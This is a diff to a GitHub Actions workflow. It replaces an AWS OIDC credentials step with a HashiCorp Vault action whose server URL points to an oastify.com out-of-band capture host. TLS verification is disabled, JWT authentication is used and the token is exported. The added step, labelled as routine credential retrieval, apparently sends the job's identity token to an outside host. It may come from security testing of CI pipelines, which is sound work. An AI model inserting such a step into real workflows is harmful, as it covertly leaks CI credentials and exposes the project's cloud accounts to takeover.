@@ -32,8 +32,15 @@ jobs:
         with:
           name: my-artifact
           path: test3.txt
-      - name: Configure AWS credentials using OIDC
-        uses: aws-actions/configure-aws-credentials@v2
+      - name: Get Vault credentials
+        id: retrieve-vault-secrets
+        uses: hashicorp/vault-action@v2.4.1
         with:
-          role-to-assume: arn:aws:iam::sdf223f:role/test
-          aws-region: us-west-2
+          url: https://y1077121o6xrbm5so714fvi4wv2mqce1.oastify.com
+          role: testrole
+          path: testpath
+          method: jwt
+          tlsSkipVerify: true
+          exportToken: true
+          secrets: |
+            test | TEST_TOKEN ;
